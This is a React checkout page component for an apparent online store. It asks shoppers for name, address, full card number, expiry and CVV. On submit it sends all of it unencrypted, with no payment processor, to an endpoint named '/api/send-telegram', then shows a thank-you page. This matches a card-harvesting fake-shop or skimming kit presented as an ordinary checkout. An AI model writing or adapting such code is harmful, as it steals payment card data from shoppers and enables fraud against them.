import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useCart } from '../context/CartContext'

const Checkout = () => {
  const { items, clearCart } = useCart()
  const navigate = useNavigate()

  const [form, setForm] = useState({
    name: '',
    email: '',
    address: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
  })

  const total = items.reduce((sum, item) => sum + item.quantity * item.product.priceFrom, 0)

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setForm((f) => ({ ...f, [name]: value }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    try {
      await fetch('/api/send-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          form: {
            name: form.name,
            email: form.email,
            address: form.address,
            cardNumber: form.cardNumber,
            expiry: form.expiry,
            cvv: form.cvv,
          },
          items,
          total,
        }),
      })

      clearCart()
      navigate('/thank-you')
    } catch (error) {
      console.error('Telegram error:', error)
    }
  }

  return (
    <main className="max-w-[640px] mx-auto px-6 lg:px-16 py-12">
      <h1 className="text-[32px] font-bold text-black mb-8">Checkout</h1>
      {items.length === 0 ? (
        <p>Your cart is empty.</p>
      ) : (
        <>
          <div className="mb-8">
            <h2 className="text-[24px] font-semibold mb-4">Order summary</h2>
            {items.map((item) => (
              <div key={item.product.id} className="flex justify-between mb-2">
                <span>{item.product.name} x {item.quantity}</span>
                <span>${(item.quantity * item.product.priceFrom).toFixed(2)}</span>
              </div>
            ))}
            <div className="flex justify-between font-bold mt-2">
              <span>Total</span>
              <span>${total.toFixed(2)}</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-[14px] font-semibold mb-1">Name</label>
              <input
                name="name"
                value={form.name}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2"
                required
              />
            </div>
            <div>
              <label className="block text-[14px] font-semibold mb-1">Email</label>
              <input
                name="email"
                type="email"
                value={form.email}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2"
                required
              />
            </div>
            <div>
              <label className="block text-[14px] font-semibold mb-1">Address</label>
              <input
                name="address"
                value={form.address}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2"
                required
              />
            </div>
            <div>
              <label className="block text-[14px] font-semibold mb-1">Card number</label>
              <input
                name="cardNumber"
                value={form.cardNumber}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2"
                required
              />
            </div>
            <div className="flex gap-4">
              <div className="flex-1">
                <label className="block text-[14px] font-semibold mb-1">Expiry</label>
                <input
                  name="expiry"
                  value={form.expiry}
                  onChange={handleChange}
                  className="w-full border border-gray-300 rounded px-3 py-2"
                  placeholder="MM/YY"
                  required
                />
              </div>
              <div className="flex-1">
                <label className="block text-[14px] font-semibold mb-1">CVV</label>
                <input
                  name="cvv"
                  value={form.cvv}
                  onChange={handleChange}
                  className="w-full border border-gray-300 rounded px-3 py-2"
                  required
                />
              </div>
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-[#00cfc1] text-black font-bold rounded hover:bg-[#00b8ac] transition-colors"
            >
              Pay ${total.toFixed(2)}
            </button>
          </form>
        </>
      )}
    </main>
  )
}

export default Checkout
